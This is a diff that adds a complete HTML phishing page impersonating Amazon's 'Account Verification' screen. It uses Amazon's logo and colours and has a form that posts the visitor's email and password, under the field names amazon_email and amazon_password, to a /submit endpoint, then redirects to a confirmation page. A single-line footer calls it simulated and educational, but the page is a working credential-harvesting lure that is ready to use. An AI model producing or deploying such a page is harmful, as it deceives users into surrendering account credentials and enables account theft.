@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Amazon Account Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      border: 1px solid #ddd;
+      padding: 30px 40px;
+      border-radius: 8px;
+      max-width: 400px;
+      width: 100%;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 150px;
+    }
+    h2 {
+      text-align: center;
+      color: #111;
+      font-weight: 700;
+      margin-bottom: 20px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      margin: 10px 0 20px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      background-color: #ff9900;
+      border: none;
+      padding: 14px;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #111;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #e68a00;
+    }
+    .disclaimer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #777;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" />
+    <h2>Account Verification</h2>
+    <form action="/submit" method="POST">
+      <input type="text" name="amazon_email" placeholder="Email or mobile phone number" required />
+      <input type="password" name="amazon_password" placeholder="Password" required />
+      <!-- Include the redirect target -->
+      <input type="hidden" name="redirect_to" value="amazon_ver_conf.html" />
+      <button type="submit">Verify Account</button>
+    </form>
+    <p class="disclaimer">This is a simulated page for educational purposes only.</p>
+  </div>
+</body>
+</html>
